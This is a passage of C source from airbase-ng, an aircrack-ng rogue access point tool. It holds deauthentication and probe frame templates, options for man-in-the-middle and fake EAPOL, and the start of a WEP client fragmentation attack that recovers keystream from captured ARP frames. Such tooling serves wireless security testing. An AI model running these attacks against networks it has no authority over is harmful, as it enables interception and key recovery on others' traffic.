/*
 *  802.11 monitor AP
 *  based on airtun-ng
 *
 *  Copyright (C) 2008-2022 Thomas d'Otreppe <tdotreppe@aircrack-ng.org>
 *  Copyright (C) 2008, 2009 Martin Beck <martin.beck2@gmx.de>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301, USA
 *
 *
 *  In addition, as a special exception, the copyright holders give
 *  permission to link the code of portions of this program with the
 *  OpenSSL library under certain conditions as described in each
 *  individual source file, and distribute linked combinations
 *  including the two.
 *  You must obey the GNU General Public License in all respects
 *  for all of the code used other than OpenSSL. *  If you modify
 *  file(s) with this exception, you may extend this exception to your
 *  version of the file(s), but you are not obligated to do so. *  If you
 *  do not wish to do so, delete this exception statement from your
 *  version. *  If you delete this exception statement from all source
 *  files in the program, then also delete it here.
 */

#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#ifdef linux
#include <linux/rtc.h>
#endif

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/time.h>

#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <dirent.h>
#include <signal.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <time.h>
#include <getopt.h>
#include <sys/file.h>
#include <fcntl.h>

#include <ctype.h>

#include "aircrack-ng/version.h"
#include "aircrack-ng/support/pcap_local.h"
#include "aircrack-ng/crypto/crypto.h"
#include "aircrack-ng/support/common.h"
#include "aircrack-ng/third-party/eapol.h"

#include "aircrack-ng/defs.h"
#include "aircrack-ng/support/communications.h"
#include "aircrack-ng/support/fragments.h"
#include "aircrack-ng/osdep/osdep.h"
#include "aircrack-ng/support/common.h"

#define EXT_IN 0x01
#define EXT_OUT 0x02

#define MAX_CF_XMIT 100

#define TI_MTU 1500
#define WIF_MTU 1800

#define MAX_FRAME_EXTENSION 100

#define RTC_RESOLUTION 512

#define ALLOW_MACS 0
#define BLOCK_MACS 1

#define DEAUTH_REQ                                                             \
	"\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB"         \
	"\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00"

#define AUTH_REQ                                                               \
	"\xB0\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"         \
	"\xBB\xBB\xBB\xBB\xBB\xBB\xB0\x00\x00\x00\x01\x00\x00\x00"

#define ASSOC_REQ                                                              \
	"\x00\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"         \
	"\xBB\xBB\xBB\xBB\xBB\xBB\xC0\x00\x31\x04\x64\x00"

#define NULL_DATA                                                              \
	"\x48\x01\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"         \
	"\xBB\xBB\xBB\xBB\xBB\xBB\xE0\x1B"

#define RTS "\xB4\x00\x4E\x04\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"

#define RATES "\x01\x04\x02\x04\x0B\x16"

#define EXTENDED_RATES "\x32\x08\x0C\x12\x18\x24\x30\x48\x60\x6C"

#define PROBE_REQ                                                              \
	"\x40\x00\x00\x00\xFF\xFF\xFF\xFF\xFF\xFF\xCC\xCC\xCC\xCC\xCC\xCC"         \
	"\xFF\xFF\xFF\xFF\xFF\xFF\x00\x00"

#define PROBE_RSP                                                              \
	"\x50\x00\x3a\x01\xFF\xFF\xFF\xFF\xFF\xFF\xCC\xCC\xCC\xCC\xCC\xCC"         \
	"\xFF\xFF\xFF\xFF\xFF\xFF\x00\x00"

#define WPA1_TAG                                                               \
	"\xdd\x16\x00\x50\xf2\x01\x01\x00\x00\x50\xf2\x02\x01\x00\x00\x50"         \
	"\xf2\x01\x01\x00\x00\x50\xf2\x02"

#define WPA2_TAG                                                               \
	"\x30\x14\x01\x00\x00\x0f\xac\x02\x01\x00\x00\x0f\xac\x01\x01\x00"         \
	"\x00\x0f\xac\x02\x01\x00"

#define ALL_WPA2_TAGS                                                          \
	"\x30\x28\x01\x00\x00\x0f\xac\x01\x05\x00\x00\x0f\xac\x01\x00\x0f"         \
	"\xac\x02\x00\x0f\xac\x03\x00\x0f\xac\x04\x00\x0f\xac\x05\x02\x00"         \
	"\x00\x0f\xac\x01\x00\x0f\xac\x02\x03\x00"

#define ALL_WPA1_TAGS                                                          \
	"\xdd\x2A\x00\x50\xf2\x01\x01\x00\x00\x50\xf2\x02\x05\x00\x00\x50"         \
	"\xf2\x01\x00\x50\xf2\x02\x00\x50\xf2\x03\x00\x50\xf2\x04\x00\x50"         \
	"\xf2\x05\x02\x00\x00\x50\xf2\x01\x00\x50\xf2\x02"

static const char usage[]
	= "\n"
	  "  %s - (C) 2008-2022 Thomas d'Otreppe\n"
	  "  Original work: Martin Beck\n"
	  "  https://www.aircrack-ng.org\n"
	  "\n"
	  "  usage: airbase-ng <options> <replay interface>\n"
	  "\n"
	  "  Options:\n"
	  "\n"
	  "      -a bssid         : set Access Point MAC address\n"
	  "      -i iface         : capture packets from this interface\n"
	  // "      -y file          : read PRGA from this file\n"
	  "      -w WEP key       : use this WEP key to en-/decrypt packets\n"
	  // "      -t tods          : send frames to AP (1) or to client (0)\n"
	  // "      -r file          : read frames out of pcap file\n"
	  "      -h MAC           : source mac for MITM mode\n"
	  "      -f disallow      : disallow specified client MACs (default: "
	  "allow)\n"
	  "      -W 0|1           : [don't] set WEP flag in beacons 0|1 (default: "
	  "auto)\n"
	  "      -q               : quiet (do not print statistics)\n"
	  "      -v               : verbose (print more messages)\n"
	  //"      -M               : M-I-T-M between [specified] clients and
	  // bssids\n"
	  "      -A               : Ad-Hoc Mode (allows other clients to peer)\n"
	  "      -Y in|out|both   : external packet processing\n"
	  "      -c channel       : sets the channel the AP is running on\n"
	  "      -X               : hidden ESSID\n"
	  "      -s               : force shared key authentication (default: "
	  "auto)\n"
	  "      -S               : set shared key challenge length (default: "
	  "128)\n"
	  "      -L               : Caffe-Latte WEP attack (use if driver can't "
	  "send "
	  "frags)\n"
	  "      -N               : cfrag WEP attack (recommended)\n"
	  "      -x nbpps         : number of packets per second (default: 100)\n"
	  "      -y               : disables responses to broadcast probes\n"
	  "      -0               : set all WPA,WEP,open tags. can't be used with "
	  "-z "
	  "& -Z\n"
	  "      -z type          : sets WPA1 tags. 1=WEP40 2=TKIP 3=WRAP 4=CCMP "
	  "5=WEP104\n"
	  "      -Z type          : same as -z, but for WPA2\n"
	  "      -V type          : fake EAPOL 1=MD5 2=SHA1 3=auto\n"
	  "      -F prefix        : write all sent and received frames into pcap "
	  "file\n"
	  "      -P               : respond to all probes, even when specifying "
	  "ESSIDs\n"
	  "      -I interval      : sets the beacon interval value in ms\n"
	  "      -C seconds       : enables beaconing of probed ESSID values "
	  "(requires -P)\n"
	  "      -n hex           : User specified ANonce when doing the 4-way "
	  "handshake\n"
	  "\n"
	  "  Filter options:\n"
	  "      --bssid MAC      : BSSID to filter/use\n"
	  "      --bssids file    : read a list of BSSIDs out of that file\n"
	  "      --client MAC     : MAC of client to filter\n"
	  "      --clients file   : read a list of MACs out of that file\n"
	  "      --essid ESSID    : specify a single ESSID (default: default)\n"
	  "      --essids file    : read a list of ESSIDs out of that file\n"
	  "\n"
	  "      --help           : Displays this usage screen\n"
	  "\n";

struct communication_options opt;
static struct local_options
{
	struct ST_info *st_1st, *st_end;

	char * dump_prefix;
	char * keyout;

	int tods;

	int f_essid;
	int promiscuous;
	int beacon_cache;
	int channel;
	int setWEP;
	int quiet;
	int mitm;
	int external;
	int hidden;
	int interval;
	int forceska;
	int skalen;
	int filter;
	int caffelatte;
	int adhoc;
	int nb_arp;
	int verbose;
	int wpa1type;
	int wpa2type;
	int nobroadprobe;
	int sendeapol;
	int allwpa;
	int cf_count;
	int cf_attack;
	int record_data;

	int ti_mtu; // MTU of tun/tap interface
	int wif_mtu; // MTU of wireless interface

	// Fixed nonce
	int use_fixed_nonce;
	unsigned char fixed_nonce[32];
} lopt;

struct devices dev;
extern struct wif *_wi_in, *_wi_out;
extern uint8_t h80211[4096];
extern uint8_t tmpbuf[4096];

struct ARP_req
{
	unsigned char * buf;
	int len;
};

struct AP_conf
{
	unsigned char bssid[6];
	char * essid;
	int essid_len;
	unsigned short interval;
	unsigned char capa[2];
};

typedef struct ESSID_list * pESSID_t;
struct ESSID_list
{
	char * essid;
	unsigned char len;
	pESSID_t next;
	time_t expire;
};

typedef struct MAC_list * pMAC_t;
struct MAC_list
{
	unsigned char mac[6];
	pMAC_t next;
};

#include "aircrack-ng/support/station.h"

typedef struct CF_packet * pCF_t;
struct CF_packet
{
	unsigned char frags[3][128]; /* first fragments to fill a gap */
	unsigned char final[4096]; /* final frame derived from orig */
	size_t fraglen[3]; /* fragmentation frame lengths   */
	size_t finallen; /* length of frame in final[]    */
	int xmitcount; /* how often was this frame sent */
	unsigned char fragnum; /* number of fragments to send   */
	pCF_t next; /* next set of fragments to send */
};

static pthread_mutex_t mx_cf; /* lock write access to rCF */
static pthread_mutex_t mx_cap; /* lock write access to rCF */

unsigned long nb_pkt_sent;

static int invalid_channel_displayed;

static struct ARP_req * arp;

static pthread_t beaconpid;
static pthread_t caffelattepid;
static pthread_t cfragpid;

static pESSID_t rESSID;
static pthread_mutex_t rESSIDmutex;
static pMAC_t rBSSID;
static pMAC_t rClient;
pFrag_t rFragment;
static pCF_t rCF;

static int addESSID(char * essid, int len, int expiration)
{
	pESSID_t tmp;
	pESSID_t cur;
	time_t now;
	if (essid == NULL) return -1;

	if (len <= 0 || len > 255) return -1;

	ALLEGE(pthread_mutex_lock(&rESSIDmutex) == 0);
	cur = rESSID;

	if (rESSID == NULL)
	{
		ALLEGE(pthread_mutex_unlock(&rESSIDmutex) == 0);
		return -1;
	}

	while (cur->next != NULL)
	{
		// if it already exists, just update the expiration time
		if (cur->len == len && !memcmp(cur->essid, essid, len))
		{
			if (cur->expire && expiration)
			{
				time(&now);
				cur->expire = now + expiration;
			}
			ALLEGE(pthread_mutex_unlock(&rESSIDmutex) == 0);
			return 0;
		}
		cur = cur->next;
	}

	// alloc mem
	tmp = (pESSID_t) malloc(sizeof(struct ESSID_list));
	ALLEGE(tmp != NULL);

	// set essid
	tmp->essid = (char *) malloc(len + 1);
	ALLEGE(tmp->essid != NULL);
	memcpy(tmp->essid, essid, len);
	tmp->essid[len] = 0x00;
	tmp->len = len;

	// set expiration date
	if (expiration)
	{
		time(&now);
		tmp->expire = now + expiration;
	}
	else
	{
		tmp->expire = 0;
	}

	tmp->next = NULL;
	cur->next = tmp;

	ALLEGE(pthread_mutex_unlock(&rESSIDmutex) == 0);
	return 0;
}

/**
 * @brief Save 802.11 frame to capture file
 * @param[in] packet 802.11 frame buffer
 * @param[in] length Length of the buffer
 * @return 0 on success, 1 on failure/error
 */
static int capture_packet(unsigned char * packet, int length)
{
	REQUIRE(packet != NULL);
	REQUIRE(length > 0);

	struct pcap_pkthdr pkh;
	struct timeval tv;
	int n;
#if defined(__sun__)
	struct flock fl;
	fl.l_start = 0;
	fl.l_len = 0;
	fl.l_whence = SEEK_SET;
#endif

	if (opt.f_cap != NULL && length >= 10)
	{
		pkh.caplen = pkh.len = length;

		gettimeofday(&tv, NULL);

		pkh.tv_sec = tv.tv_sec;
		pkh.tv_usec = tv.tv_usec;

		n = sizeof(pkh);

#if defined(__sun__)
		fl.l_type = F_WRLCK;
		fcntl(fileno(opt.f_cap), F_SETLKW, &fl);
#else
		flock(fileno(opt.f_cap), LOCK_EX);
#endif
		if (fwrite(&pkh, 1, n, opt.f_cap) != (size_t) n)
		{
			perror("fwrite(packet header) failed");
#if defined(__sun__)
			fl.l_type = F_UNLCK;
			fcntl(fileno(opt.f_cap), F_GETLK, &fl);
#else
			flock(fileno(opt.f_cap), LOCK_UN);
#endif
			return (1);
		}

		fflush(stdout);

		n = pkh.caplen;

		if (fwrite(packet, 1, n, opt.f_cap) != (size_t) n)
		{
			perror("fwrite(packet data) failed");
#if defined(__sun__)
			fl.l_type = F_UNLCK;
			fcntl(fileno(opt.f_cap), F_GETLK, &fl);
#else
			flock(fileno(opt.f_cap), LOCK_UN);
#endif
			return (1);
		}

		fflush(stdout);

		fflush(opt.f_cap);
#if defined(__sun__)
		fl.l_type = F_UNLCK;
		fcntl(fileno(opt.f_cap), F_GETLK, &fl);
#else
		flock(fileno(opt.f_cap), LOCK_UN);
#endif
	}
	return 0;
}

static int addMAC(pMAC_t pMAC, unsigned char * mac)
{
	pMAC_t cur = pMAC;

	if (mac == NULL) return -1;

	if (pMAC == NULL) return -1;

	while (cur->next != NULL) cur = cur->next;

	// alloc mem
	cur->next = (pMAC_t) malloc(sizeof(struct MAC_list));
	ALLEGE(cur->next != NULL);
	cur = cur->next;

	// set mac
	memcpy(cur->mac, mac, 6);

	cur->next = NULL;

	return 0;
}

static void flushESSID(void)
{
	pESSID_t old;
	pESSID_t cur;
	time_t now;

	ALLEGE(pthread_mutex_lock(&rESSIDmutex) == 0);
	cur = rESSID;

	if (rESSID == NULL)
	{
		ALLEGE(pthread_mutex_unlock(&rESSIDmutex) == 0);
		return;
	}

	while (cur->next != NULL)
	{
		old = cur->next;
		if (old->expire)
		{
			time(&now);
			if (now > old->expire)
			{
				// got it
				cur->next = old->next;

				free(old->essid);
				old->essid = NULL;
				old->next = NULL;
				old->len = 0;
				free(old);
				ALLEGE(pthread_mutex_unlock(&rESSIDmutex) == 0);
				return;
			}
		}
		cur = cur->next;
	}
	ALLEGE(pthread_mutex_unlock(&rESSIDmutex) == 0);
}

static int gotESSID(char * essid, int len)
{
	pESSID_t old, cur;

	if (essid == NULL) return (-1);

	if (len <= 0 || len > 255) return (-1);

	ALLEGE(pthread_mutex_lock(&rESSIDmutex) == 0);
	cur = rESSID;

	if (rESSID == NULL)
	{
		ALLEGE(pthread_mutex_unlock(&rESSIDmutex) == 0);
		return (-1);
	}

	while (cur->next != NULL)
	{
		old = cur->next;
		if (old->len == len)
		{
			if (memcmp(old->essid, essid, len) == 0)
			{
				ALLEGE(pthread_mutex_unlock(&rESSIDmutex) == 0);
				return (1);
			}
		}
		cur = cur->next;
	}

	ALLEGE(pthread_mutex_unlock(&rESSIDmutex) == 0);
	return (0);
}

static int gotMAC(pMAC_t pMAC, unsigned char * mac)
{
	pMAC_t cur = pMAC;

	if (mac == NULL) return (-1);

	if (pMAC == NULL) return (-1);

	while (cur->next != NULL)
	{
		cur = cur->next;
		if (memcmp(cur->mac, mac, 6) == 0)
		{
			// got it
			return (1);
		}
	}

	return (0);
}

static int getESSID(char * essid)
{
	int len;

	ALLEGE(pthread_mutex_lock(&rESSIDmutex) == 0);

	if (rESSID == NULL || rESSID->next == NULL)
	{
		ALLEGE(pthread_mutex_unlock(&rESSIDmutex) == 0);
		return (0);
	}

	memcpy(essid, rESSID->next->essid, rESSID->next->len + 1);
	len = rESSID->next->len;
	ALLEGE(pthread_mutex_unlock(&rESSIDmutex) == 0);

	return (len);
}

static int getNextESSID(char * essid)
{
	int len;
	pESSID_t cur;

	ALLEGE(pthread_mutex_lock(&rESSIDmutex) == 0);

	if (rESSID == NULL || rESSID->next == NULL)
	{
		ALLEGE(pthread_mutex_unlock(&rESSIDmutex) == 0);
		return (0);
	}

	len = strlen(essid);
	for (cur = rESSID->next; cur != NULL; cur = cur->next)
	{
		if (*essid == 0)
		{
			break;
		}
		// Check if current SSID.
		if (cur->len == len && cur->essid != NULL
			&& strcmp(essid, cur->essid) == 0)
		{
			// SSID found, get next one
			cur = cur->next;
			if (cur == NULL)
			{
				cur = rESSID->next;
			}
			break;
		}
	}
	len = 0;

	if (cur != NULL)
	{
		memcpy(essid, cur->essid, cur->len + 1);
		len = cur->len;
	}
	ALLEGE(pthread_mutex_unlock(&rESSIDmutex) == 0);

	return (len);
}

static int getESSIDcount(void)
{
	pESSID_t cur;
	int count = 0;

	ALLEGE(pthread_mutex_lock(&rESSIDmutex) == 0);
	cur = rESSID;

	if (rESSID == NULL)
	{
		ALLEGE(pthread_mutex_unlock(&rESSIDmutex) == 0);
		return (-1);
	}

	while (cur->next != NULL)
	{
		cur = cur->next;
		count++;
	}

	ALLEGE(pthread_mutex_unlock(&rESSIDmutex) == 0);
	return (count);
}

static int getMACcount(pMAC_t pMAC)
{
	pMAC_t cur = pMAC;
	int count = 0;

	if (pMAC == NULL) return (-1);

	while (cur->next != NULL)
	{
		cur = cur->next;
		count++;
	}

	return (count);
}

static int addESSIDfile(char * filename)
{
	REQUIRE(filename != NULL);

	FILE * list;
	char essid[256];
	int x;

	list = fopen(filename, "r");
	if (list == NULL)
	{
		perror("Unable to open ESSID list");
		return (-1);
	}

	while (fgets(essid, 256, list) != NULL)
	{
		// trim trailing whitespace
		rtrim(essid);

		x = (int) strlen(essid);
		if (x > 0) addESSID(essid, x, 0);
	}

	fclose(list);

	return (0);
}

static int addMACfile(pMAC_t pMAC, char * filename)
{
	REQUIRE(filename != NULL);

	FILE * list;
	unsigned char mac[6];
	char buffer[256];

	list = fopen(filename, "r");
	if (list == NULL)
	{
		perror("Unable to open MAC list");
		return (-1);
	}

	while (fgets(buffer, 256, list) != NULL)
	{
		if (getmac(buffer, 1, mac) == 0) addMAC(pMAC, mac);
	}

	fclose(list);

	return (0);
}

/**
 * @brief Send 802.11 frame, and optionally save it to the capture file
 * @param[in] buf Buffer containing the frame
 * @param[in] count Size of the 'buffer' variable
 * @return return value from send_packet()
 */
static int my_send_packet(void * buf, size_t count)
{
	int rc = send_packet(_wi_out, buf, count, kRewriteSequenceNumber);

	ALLEGE(pthread_mutex_lock(&mx_cap) == 0);
	if (lopt.record_data) capture_packet(buf, (int) count);
	ALLEGE(pthread_mutex_unlock(&mx_cap) == 0);

	return (rc);
}

#define IEEE80211_LLC_SNAP                                                     \
	"\x08\x00\x00\x00\xDD\xDD\xDD\xDD\xDD\xDD\xBB\xBB\xBB\xBB\xBB\xBB"         \
	"\xCC\xCC\xCC\xCC\xCC\xCC\xE0\x32\xAA\xAA\x03\x00\x00\x00\x08\x00"

static int intercept(unsigned char * packet, int length)
{
	REQUIRE(packet != NULL);
	REQUIRE(length > 0);

	unsigned char buf[4096];
	unsigned char K[128];
	int z = 0;

	memset(buf, 0, 4096);

	z = ((packet[1] & 3) != 3) ? 24 : 30;

	if (opt.crypt == CRYPT_WEP)
	{
		memcpy(K, packet + z, 3);
		memcpy(K + 3, opt.wepkey, opt.weplen);

		if (decrypt_wep(
				packet + z + 4, length - z - 4, K, (int) (3 + opt.weplen))
			== 0)
		{
			// ICV check failed!
			return (1);
		}

		/* WEP data packet was successfully decrypted, *
		* remove the WEP IV & ICV and write the data  */

		length -= 8;

		memcpy(packet + z, packet + z + 4, (size_t) length - z);
	}

	/* clear wep bit */
	packet[1] &= 0xBF;

	// insert ethernet header
	memcpy(buf + 14, packet, (size_t) length);
	length += 14;

	ti_write(dev.dv_ti2, buf, length);
	return (0);
}

static int packet_xmit(unsigned char * packet, int length)
{
	unsigned char buf[4096];
	int fragments = 1, i;
	size_t newlen = 0, usedlen = 0, length2;

	if (packet == NULL) return (1);

	if (length < 38) return (1);

	if (length - 14 > 16 * lopt.wif_mtu - MAX_FRAME_EXTENSION) return (1);

	if (length + MAX_FRAME_EXTENSION > lopt.wif_mtu)
		fragments = ((length - 14 + MAX_FRAME_EXTENSION) / lopt.wif_mtu) + 1;

	if (fragments > 16) return (1);

	if (fragments > 1)
		newlen = (length - 14u + MAX_FRAME_EXTENSION) / fragments;
	else
		newlen = length - 14u;

	for (i = 0; i < fragments; i++)
	{
		if (i == fragments - 1)
			newlen = length - 14
					 - usedlen; // use all remaining bytes for the last fragment

		if (i == 0)
		{
			memcpy(h80211, IEEE80211_LLC_SNAP, 32);
			memcpy(h80211 + 32, packet + 14 + usedlen, newlen);
			memcpy(h80211 + 30, packet + 12, 2);
		}
		else
		{
			memcpy(h80211, IEEE80211_LLC_SNAP, 24);
			memcpy(h80211 + 24, packet + 14 + usedlen, newlen);
		}

		h80211[1] |= 0x02;
		memcpy(h80211 + 10, opt.r_bssid, 6); // BSSID
		memcpy(h80211 + 16, packet + 6, 6); // SRC_MAC
		memcpy(h80211 + 4, packet, 6); // DST_MAC

		h80211[22] |= i & 0x0F; // set fragment
		h80211[1] |= 0x04; // more frags

		if (i == (fragments - 1))
		{
			h80211[1] &= 0xFB; // no more frags
		}

		length2 = newlen + 32;

		if ((lopt.external & EXT_OUT))
		{
			memset(buf, 0, 4096);
			memcpy(buf + 14, h80211, length2);
			// mark it as outgoing packet
			buf[12] = 0xFF;
			buf[13] = 0xFF;
			ti_write(dev.dv_ti2, buf, (int) length2 + 14);
		}
		else
		{
			if (opt.crypt == CRYPT_WEP || opt.prgalen > 0)
			{
				if (create_wep_packet(h80211, &length2, 24) != 0) return (1);
			}

			my_send_packet(h80211, length2);
		}

		usedlen += newlen;

		if ((i + 1) < fragments) usleep(3000);
	}

	return (0);
}

static int packet_recv(uint8_t * packet,
					   size_t length,
					   struct AP_conf * apc,
					   int external);

static int packet_xmit_external(unsigned char * packet,
								size_t length,
								struct AP_conf * apc)
{
	uint8_t buf[4096];
	size_t z = 0;

	if (packet == NULL) return (1);

	if (length < 40 || length > 3000) return (1);

	memset(buf, 0, 4096);
	if (memcmp(packet, buf, 11) != 0) //-V512
	{
		// Wrong header
		return (1);
	}

	/* cut ethernet header */
	memcpy(buf, packet, length);
	length -= 14;
	memcpy(packet, buf + 14, length);

	z = ((packet[1] & 3) != 3) ? 24 : 30;

	if (opt.crypt == CRYPT_WEP || opt.prgalen > 0)
	{
		if (create_wep_packet(packet, &length, z) != 0) return (1);
	}

	if (memcmp(buf + 12, (unsigned char *) "\x00\x00", 2)
		== 0) /* incoming packet */
	{
		packet_recv(packet, length, apc, 0);
	}
	else if (memcmp(buf + 12, (unsigned char *) "\xFF\xFF", 2)
			 == 0) /* outgoing packet */
	{
		my_send_packet(packet, length);
	}

	return (0);
}

/**
 * @brief Remove specific Information Element(s) (aka tag) from a frame.
 *        Handle when multiple tags with the same number exist.
 * @param[in,out] tagged_params Buffer containing IEs, starting at an IE
 * @param[in] exclude_tag_id tag number to remove. See enum containing IEEE80211_ELEMID_ items in ieee80211.h
 * @param[in,out] tp_length Length of the 'flags' buffer. It gets updated if the tag is removed
 * @return 0 on success, 1 on error/failure
 */
static int remove_tag(uint8_t * tagged_params,
					  const uint8_t exclude_tag_id,
					  size_t * tp_length)
{
	REQUIRE(tp_length != NULL);

	size_t dst_pos = 0, src_pos = 0;
	uint8_t cur_tag_id;
	uint8_t cur_tag_length;
	size_t cur_tag_total_len;

	if (tagged_params == NULL) return (1);

	if (*tp_length == 0) return (1);

	while (src_pos < *tp_length)
	{
		// Handle the case when frame is malformed ...
		if (src_pos + 2 > *tp_length) break;

		// Grab tag id and its length
		cur_tag_id = tagged_params[src_pos];
		cur_tag_length = tagged_params[src_pos + 1];

		cur_tag_total_len = cur_tag_length + 2;

		// Now validate the frame is still valid and we have enough buffer
		if (src_pos + cur_tag_total_len > *tp_length) break;

		// If we skipped 1+ tag, then we need to move this tag
		if (src_pos != dst_pos)
		{
			// memmove tag by tag, there might be multiple instances of the tag to exclude
			memmove(tagged_params + dst_pos,
					tagged_params + src_pos,
					cur_tag_total_len);
		}

		// Compute new positions
		src_pos += cur_tag_total_len;
		if (cur_tag_id != exclude_tag_id)
		{
			dst_pos += cur_tag_total_len;
		}
	}

	// In case something goes wrong in the parsing of a tag, move what's
	// available so we don't leave frame in unknown state
	const size_t avail_length = (*tp_length) - src_pos;
	if (avail_length && tagged_params[src_pos] != exclude_tag_id
		&& src_pos != dst_pos)
	{
		memmove(tagged_params + dst_pos, tagged_params + src_pos, avail_length);
		dst_pos += avail_length;
	}

	// Update length
	*tp_length = dst_pos;

	return (avail_length == 0);
}

/**
 * @brief Parse a specific Information Element (IE), aka Tag, to return
 *        a pointer to the location of its value and its length
 * @param[in] flags Buffer containing IEs, starting at an IE
 * @param[in] type IE/tag number to search for. See enum containing IEEE80211_ELEMID_ items in ieee80211.h
 * @param[in] length length of the 'flags' buffer
 * @param[out] taglen returning the length of the tag, if found
 *
 * @return pointer to the start of the IE value, or NULL when there is
 *         an error or the IE hasn't been found
 *
 * @note
 * IE (aka tag) is of Type-Length-Value (TLV):
 * - 1 byte for the tag number (unsigned char)
 * - 1 byte for the length (unsigned char)
 * - X bytes (defined by the 'length' field right before) for the
 *   value whose interpretation depends on the type, and sometimes
 *   more (such as WPA/RSN IE).
 *
 * These are present in management frames, and vary. However, they
 * are typically ordered by tag
 */
static unsigned char * parse_tags(unsigned char * flags,
								  const unsigned char type,
								  const int length,
								  size_t * taglen)
{
	int cur_type = 0, cur_len = 0, len = 0;
	unsigned char * pos;

	if (length < 2) return (NULL);

	if (flags == NULL) return (NULL);

	pos = flags;

	do
	{
		cur_type = pos[0];
		cur_len = pos[1];
		if (len + 2 + cur_len > length) return (NULL);

		if (cur_type == type)
		{
			if (cur_len > 0)
			{
				*taglen = (size_t) cur_len;
				return pos + 2;
			}
			else
				return (NULL);
		}
		pos += cur_len + 2;
		len += cur_len + 2;
	} while (len + 2 <= length);

	return (NULL);
}

/**
 * @brief Parses the WPA (Vendor specific) or RSN tag and fill out the station information structure
 * @param[in,out] st_cur pointer to the current station
 * @param[in] tag start of the WPA/RSN tag/IE. See enum containing IEEE80211_ELEMID_ items in ieee80211.h
 * @param[in] length length of the tag buffer
 * @return 0 on success, 1 on error/failure
 */
static int
wpa_client(struct ST_info * st_cur, const unsigned char * tag, const int length)
{
	if (tag == NULL) return (1);

	if (st_cur == NULL) return (1);

	if (length <= 0) return (1);

	if (tag[0] != IEEE80211_ELEMID_VENDOR
		&& tag[0] != IEEE80211_ELEMID_RSN) // wpa1 or wpa2
		return (1);

	// TODO: improve parsing, in the event if there are multiple cipher suites
	if (tag[0] == IEEE80211_ELEMID_VENDOR)
	{
		if (length < 24) return (1);

		// Get first unicast cipher suite
		switch (tag[17])
		{
			case WPA_CSE_TKIP:
				st_cur->wpahash = 1; // md5|tkip
				break;
			case WPA_CSE_CCMP:
				st_cur->wpahash = 2; // sha1|ccmp
				break;
			default:
				return (1);
		}

		st_cur->wpatype = 1; // wpa1
	}

	if (tag[0] == IEEE80211_ELEMID_RSN && st_cur->wpatype == 0)
	{
		if (length < 22) return (1);

		// Get first unicast cipher suite
		switch (tag[13])
		{
			case WPA_CSE_TKIP:
				st_cur->wpahash = 1; // md5|tkip
				break;
			case WPA_CSE_CCMP:
				st_cur->wpahash = 2; // sha1|ccmp
				break;
			default:
				return (1);
		}

		st_cur->wpatype = 2; // wpa2
	}

	return (0);
}

// add packet for client fragmentation attack
static int addCF(unsigned char * packet, size_t length)
{
	pCF_t curCF = rCF;
	unsigned char bssid[6];
	unsigned char smac[6];
	unsigned char dmac[6];
	unsigned char keystream[128];
	unsigned char frag1[128], frag2[128], frag3[128];
	unsigned char clear[4096], final[4096], flip[4096];
	int isarp;
	size_t z, i;

	if (curCF == NULL) return (1);
	if (packet == NULL) return (1);

	z = ((packet[1] & 3) != 3) ? 24 : 30;

	if (length < z + 8) return (1);

	if (length > 3800)
	{
		return (1);
	}

	if (lopt.cf_count >= 100) return (1);

	memset(clear, 0, 4096);
	memset(final, 0, 4096);
	memset(flip, 0, 4096);
	memset(frag1, 0, 128);
	memset(frag2, 0, 128);
	memset(frag3, 0, 128);
	memset(keystream, 0, 128);

	switch (packet[1] & 3)
	{
		case 0:
			memcpy(bssid, packet + 16, 6);
			memcpy(dmac, packet + 4, 6);
			memcpy(smac, packet + 10, 6);
			break;
		case 1:
			memcpy(bssid, packet + 4, 6);
			memcpy(dmac, packet + 16, 6);
			memcpy(smac, packet + 10, 6);
			break;
		case 2:
			memcpy(bssid, packet + 10, 6);
			memcpy(dmac, packet + 4, 6);
			memcpy(smac, packet + 16, 6);
			break;
		default:
			memcpy(bssid, packet + 10, 6);
			memcpy(dmac, packet + 16, 6);
			memcpy(smac, packet + 24, 6);
			break;
	}

	if (is_ipv6(packet))
	{
		if (opt.verbose)
		{
			PCT;
			printf("Ignored IPv6 packet.\n");
		}

		return (1);
	}

	if (is_dhcp_discover(packet, length - z - 4 - 4))
	{
		if (opt.verbose)
		{
			PCT;
			printf("Ignored DHCP Discover packet.\n");
		}

		return (1);
	}

	/* check if it's a potential ARP request */

	// its length 68 or 86 and going to broadcast or a unicast mac (even first
	// byte)
	if ((length == 68 || length == 86)
		&& (memcmp(dmac, BROADCAST, 6) == 0 || (dmac[0] % 2) == 0))
	{
		/* process ARP */
		isarp = 1;
		// build the new packet
		set_clear_arp(clear, smac, dmac);
		set_final_arp(final, opt.r_smac);

		for (i = 0; i < 14; i++) keystream[i] = (packet + z + 4)[i] ^ clear[i];

		// correct 80211 header
		packet[0] = 0x08; // data
		if ((packet[1] & 3) == 0x00) // ad-hoc
		{
			packet[1] = 0x40; // wep
			memcpy(packet + 4, smac, 6);
			memcpy(packet + 10, opt.r_smac, 6);
			memcpy(packet + 16, bssid, 6);
		}
		else // tods
		{
			packet[1] = 0x42; // wep+FromDS
			memcpy(packet + 4, smac, 6);
			memcpy(packet + 10, bssid, 6);
